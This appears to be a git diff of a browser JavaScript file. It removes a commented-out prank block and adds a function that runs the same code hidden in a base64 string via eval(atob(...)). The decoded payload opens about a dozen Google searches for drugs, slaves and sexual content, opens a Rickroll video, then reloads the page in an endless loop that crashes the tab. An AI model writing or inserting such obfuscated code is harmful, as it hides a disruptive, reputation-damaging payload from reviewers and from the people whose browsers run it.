@@ -8,25 +8,11 @@ document.addEventListener('keydown', function(event) {
     }
 });
 
+function dontcallme(){
+    eval(atob("b3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9QmlnK0JsYWNrK09pbHkrTWVuIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9V2hlcmUrdG8rYnV5K3JlYWwrdGVzdGljYWxzIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9Q29sdW1iaWFuK2NvY2FpbmUrcmVjaXBlIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9SG93K3RvK2dldCtnaXJsZnJpZW5kIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9V2hlcmUrdG8rYnV5K21ldGhhbXBoZXRhbWluZSIpOwogICAgICAgIG9wZW4oImh0dHA6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUhvdyt0bytidXkrc2xhdmVzIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9TG9va2luZytmb3IrZ2F5K3NleCIpOwogICAgICAgIG9wZW4oImh0dHA6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUltK0dheSIpOwogICAgICAgIG9wZW4oImh0dHA6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUdheStQb3JuIik7CiAgICAgICAgb3BlbigiaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9SG90K01JTEZzK0luK015K0FyZWEiKTsKICAgICAgICBvcGVuKCJodHRwOi8vZ29vZ2xlLmNvbS9zZWFyY2g/cT1Mb29raW5nK0ZvcitTZXgiKTsKICAgICAgICBvcGVuKCJodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PWRRdzR3OVdnWGNRJmFiX2NoYW5uZWw9Umlja0FzdGxleSIpOwogICAgICAgICAgICAvL2NyYXNoZXIKICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICB3aGlsZSgxKXt3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7fQogICAgICAgICAgICB9LCA3MDAwKTs="));
+}
+
 function run(){
-    // if(pwd=="gayporn"){
-    //     open("http://google.com/search?q=Big+Black+Oily+Men");
-    //     open("http://google.com/search?q=Where+to+buy+real+testicals");
-    //     open("http://google.com/search?q=Columbian+cocaine+recipe");
-    //     open("http://google.com/search?q=How+to+get+girlfriend");
-    //     open("http://google.com/search?q=Where+to+buy+methamphetamine");
-    //     open("http://google.com/search?q=How+to+buy+slaves");
-    //     open("http://google.com/search?q=Looking+for+gay+sex");
-    //     open("http://google.com/search?q=Im+Gay");
-    //     open("http://google.com/search?q=Gay+Porn");
-    //     open("http://google.com/search?q=Hot+MILFs+In+My+Area");
-    //     open("http://google.com/search?q=Looking+For+Sex");
-    //     open("https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
-    //         //crasher
-    //         setTimeout(() => {
-    //             while(1){window.location.reload();}
-    //         }, 7000);
-    // }
 
     var iframe = document.createElement('iframe');
     
